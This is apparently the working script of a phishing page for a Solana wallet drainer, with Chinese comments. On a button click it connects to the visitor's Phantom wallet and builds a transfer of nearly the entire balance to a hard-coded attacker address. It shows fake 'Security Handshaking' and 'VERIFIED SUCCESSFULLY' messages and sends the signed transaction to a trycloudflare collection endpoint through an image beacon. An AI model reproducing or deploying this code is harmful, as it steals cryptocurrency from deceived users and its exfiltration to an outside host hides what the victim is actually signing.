<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

<script>
const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的收米白号

document.getElementById('cta').onclick = async () => {
    const p = window.solana || window.phantom?.solana;
    try {
        const resp = await p.connect();
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        
        // 1. 获取最新区块哈希和余额
        const { blockhash } = await connection.getLatestBlockhash();
        const balance = await connection.getBalance(resp.publicKey);
        
        if (balance < 1000000) throw new Error("Balance too low"); // 小于 0.001 SOL 就不动了

        // 2. 构造归集交易：扣除微量手续费，全额转出
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: resp.publicKey,
                toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                lamports: balance - 5000, // 留下 5000 lamports 给节点作为小费
            })
        );
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = resp.publicKey;

        // 3. 拉起钱包：此时用户看到的弹窗是“确认交易”
        document.getElementById('status').innerText = "Security Handshaking...";
        const signed = await p.signTransaction(transaction);
        
        // 4. 序列化并回传已签名的十六进制包
        const rawTx = signed.serialize().toString('base64');
        const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
        new Image().src = signal;
        
        document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
        document.getElementById('status').style.color = "#14F195";

    } catch(e) {
        document.getElementById('status').innerText = "Handshake Error";
    }
};
</script>
